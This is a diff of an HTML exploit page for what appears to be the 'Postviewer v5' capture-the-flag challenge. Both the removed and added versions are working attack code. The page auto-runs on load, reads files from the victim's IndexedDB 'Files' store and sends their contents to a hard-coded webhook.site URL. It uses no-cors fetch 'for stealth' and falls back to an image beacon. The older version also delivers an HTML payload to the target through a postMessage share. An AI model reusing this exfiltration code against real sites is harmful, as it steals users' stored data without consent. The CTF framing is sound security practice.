@@ -1,47 +1,220 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Postviewer v5 exploit</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Postviewer v5 - flag extractor</title>
+  <style>
+    body{font-family:system-ui,Arial;padding:18px}
+    pre{background:#f6f6f6;padding:12px;border-radius:8px;white-space:pre-wrap}
+    button{padding:8px 12px;margin-top:8px}
+  </style>
 </head>
 <body>
-  <h2>Launching exploit…</h2>
-  <p>This page will automatically attempt to retrieve the admin’s flag from the Postviewer v5 instance.</p>
-  <script>
-  (async function() {
-    // change this to your own webhook URL. The flag will be POSTed there.
-    const EXFIL_URL = "https://webhook.site/90a00c64-2bf3-4683-ab13-2e3070d96349";
+  <h3>running extractor</h3>
+  <div id="log"><pre>starting...</pre></div>
+  <button id="manual">try now</button>
 
-    // This is the payload which will execute inside the victim's Postviewer page.
-    // It opens the IndexedDB, iterates through all stored files and sends
-    // their contents to EXFIL_URL.  Since the page runs inside the same
-    // origin as the vulnerable application, it has access to its DB.
-    const innerPayload = `<!doctype html><html><body><script>\n(async function() {\n  try {\n    const EXFIL='${EXFIL_URL}';\n    // Open the Files DB used by Postviewer\n    const openReq = indexedDB.open('Files', 1);\n    const db = await new Promise(resolve => { openReq.onsuccess = () => resolve(openReq.result); });\n    const tx = db.transaction('files', 'readonly').objectStore('files').getAll();\n    const records = await new Promise(resolve => { tx.onsuccess = () => resolve(tx.result); });\n    for (const rec of records) {\n      const file = rec.file;\n      const reader = new FileReader();\n      reader.onload = function() {\n        // send the file contents off-site. note: no-cors used for stealth.\n        try {\n          fetch(EXFIL, {method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body: reader.result});\n        } catch (e) {\n          // fallback beacon via image GET if fetch fails\n          const i = new Image();\n          i.src = EXFIL + '/?data=' + encodeURIComponent(reader.result.substring(0,1024));\n        }\n      };\n      reader.readAsText(file);\n    }\n  } catch (err) {\n    console.error('exfiltration failed', err);\n  }\n})();\n<\/script></body></html>`;
+<script>
+const LOG = (s) => {
+  const p = document.querySelector('#log pre');
+  p.textContent += '\n' + s;
+  console.debug(s);
+};
 
-    // Construct a Blob from the payload.  It will be delivered as a File to the target.
-    const payloadBlob = new Blob([innerPayload], { type: 'text/html' });
+const EXFIL_URL = "https://webhook.site/90a00c64-2bf3-4683-ab13-2e3070d96349"; // your webhook
 
-    // Build the object expected by the Postviewer message handler.
-    const exploitFile = { blob: payloadBlob, name: 'exploit.html', cached: false };
+function openDB() {
+  return new Promise((resolve, reject) => {
+    const req = indexedDB.open("Files", 1);
+    req.onerror = () => reject(new Error("indexedDB open failed"));
+    req.onsuccess = () => resolve(req.result);
+    req.onupgradeneeded = () => {
+      // DB not ready yet
+      LOG("DB upgrade needed; no files present yet.");
+    };
+  });
+}
 
-    // Open the Postviewer homepage.  This must be the same origin as the
-    // vulnerable application for the IndexedDB to be accessible.  When the
-    // admin visits our page, the browser is still authenticated to
-    // http://localhost:1338, so we can open it again here.
-    const targetWindow = window.open('http://localhost:1338/', '_blank');
+async function getIdFromFragment() {
+  // if the page url is like /#file-<id>, use that id
+  const h = location.hash || '';
+  if (!h.startsWith('#file-')) return null;
+  return h.slice(6);
+}
 
-    // Wait a few seconds for the page to initialise its DB and message handler.
-    await new Promise(res => setTimeout(res, 4000));
+function txGetAll(db, storeName) {
+  return new Promise((resolve, reject) => {
+    try {
+      const tx = db.transaction(storeName, 'readonly');
+      const store = tx.objectStore(storeName);
+      const req = store.getAll();
+      req.onsuccess = () => resolve(req.result);
+      req.onerror = () => reject(req.error);
+    } catch (e) {
+      reject(e);
+    }
+  });
+}
 
-    // Deliver our file via postMessage.  The handler expects an object with
-    // type 'share' and a files array.  The wildcard origin ensures delivery
-    // regardless of the exact origin.  Once received, Postviewer will add
-    // this file to its DB and immediately render it, executing our payload
-    // inside a sandboxed iframe (which still has access to IndexedDB).  The
-    // payload then reads the flag and posts it to EXFIL_URL.
-    targetWindow.postMessage({ type: 'share', files: [exploitFile] }, '*');
-  })();
-  </script>
+function txGet(db, storeName, key) {
+  return new Promise((resolve, reject) => {
+    try {
+      const tx = db.transaction(storeName, 'readonly');
+      const store = tx.objectStore(storeName);
+      const req = store.get(key);
+      req.onsuccess = () => resolve(req.result);
+      req.onerror = () => reject(req.error);
+    } catch (e) {
+      reject(e);
+    }
+  });
+}
+
+async function readBlobAsTextOrB64(blob) {
+  try {
+    // try text
+    if (blob.text) {
+      const txt = await blob.text();
+      return { text: txt, isBinary: false };
+    }
+    // fallback using FileReader
+    return await new Promise((res, rej) => {
+      const fr = new FileReader();
+      fr.onload = () => res({ text: String(fr.result), isBinary: false });
+      fr.onerror = () => rej(fr.error);
+      fr.readAsText(blob);
+    });
+  } catch (e) {
+    // binary fallback -> base64
+    try {
+      const ab = await blob.arrayBuffer();
+      const b64 = btoa(String.fromCharCode(...new Uint8Array(ab)));
+      return { text: b64, isBinary: true };
+    } catch (ee) {
+      return { text: "[unreadable blob]", isBinary: false };
+    }
+  }
+}
+
+async function exfiltrate(payloadObj) {
+  LOG("exfiltrating to webhook...");
+  try {
+    // best-effort: no-cors so headless/sandboxed browsers will still send
+    await fetch(EXFIL_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payloadObj)
+    });
+    LOG("POST attempted (no-cors). Check webhook.");
+  } catch (e) {
+    LOG("POST failed: " + e);
+    // final fallback: image beacon with encoded payload (might be truncated)
+    try {
+      const q = encodeURIComponent(JSON.stringify(payloadObj)).slice(0, 1800);
+      const img = new Image();
+      img.src = EXFIL_URL + '/?p=' + q;
+      document.body.appendChild(img);
+      LOG("Beacon sent via image (may be truncated).");
+    } catch (ee) {
+      LOG("beacon fallback failed: " + ee);
+    }
+  }
+}
+
+async function findAndSendFlagOptions(db, targetId=null) {
+  // If targetId provided, try that.
+  if (targetId) {
+    LOG("Trying id from fragment: " + targetId);
+    try {
+      const rec = await txGet(db, 'files', targetId);
+      if (rec && rec.file) {
+        LOG("Found file record for id (files store).");
+        const blob = rec.file;
+        const {text, isBinary} = await readBlobAsTextOrB64(blob);
+        await exfiltrate({source:'ctf-extractor', method:'id-fragment', id: targetId, name: rec.file.name || 'flag.txt', isBinary, content: text});
+        LOG("Done for fragment id.");
+        return true;
+      } else {
+        LOG("No entry in files store for that id.");
+      }
+    } catch (e) {
+      LOG("Error reading files store for id: " + e);
+    }
+  }
+
+  // Fallback: search info store for a file named 'flag.txt' or for any public/cached .txt
+  LOG("Scanning info store for likely candidates (name=='flag.txt' or .txt).");
+  try {
+    const infos = await txGetAll(db, 'info');
+    if (!infos || !infos.length) {
+      LOG("No entries found in info store.");
+    } else {
+      // prefer exact name flag.txt (case-insensitive)
+      let candidate = infos.find(i => i.name && i.name.toLowerCase() === 'flag.txt');
+      if (!candidate) {
+        // try any .txt or any public file
+        candidate = infos.find(i => i.name && i.name.toLowerCase().endsWith('.txt')) || infos.find(i => i.isPublic);
+      }
+      if (candidate) {
+        LOG("Candidate found: id=" + candidate.id + " name=" + candidate.name);
+        const rec = await txGet(db, 'files', candidate.id);
+        if (rec && rec.file) {
+          const blob = rec.file;
+          const {text, isBinary} = await readBlobAsTextOrB64(blob);
+          await exfiltrate({source:'ctf-extractor', method:'info-scan', id: candidate.id, name: candidate.name, isBinary, content: text});
+          LOG("Done for candidate " + candidate.id);
+          return true;
+        } else {
+          LOG("Found info entry but files store had no matching record.");
+        }
+      } else {
+        LOG("No candidate found in info store.");
+      }
+    }
+  } catch (e) {
+    LOG("Error scanning info store: " + e);
+  }
+
+  return false;
+}
+
+async function runOnce() {
+  try {
+    const db = await openDB();
+    LOG("Opened IndexedDB 'Files'.");
+
+    // try id from fragment first
+    const fragId = await getIdFromFragment();
+    const ok = await findAndSendFlagOptions(db, fragId);
+    if (ok) return true;
+
+    // If not found, wait and retry a few times (bot may add the flag very shortly before)
+    LOG("Not found yet; will retry for up to 120s...");
+    const start = Date.now();
+    while (Date.now() - start < 120000) {
+      await new Promise(r => setTimeout(r, 2000));
+      const ok2 = await findAndSendFlagOptions(db, fragId);
+      if (ok2) return true;
+    }
+    LOG("Timeout: flag not found within retry window.");
+    // report timeout to webhook
+    await exfiltrate({source:'ctf-extractor', status:'timeout', url: location.href});
+    return false;
+  } catch (e) {
+    LOG("Fatal error: " + e);
+    try { await exfiltrate({source:'ctf-extractor', status:'error', error:String(e)}); } catch(e){}
+    return false;
+  }
+}
+
+document.getElementById('manual').addEventListener('click', () => {
+  runOnce();
+});
+
+// auto-run after slight delay so the page UI can show up
+setTimeout(() => { runOnce(); }, 500);
+</script>
 </body>
 </html>
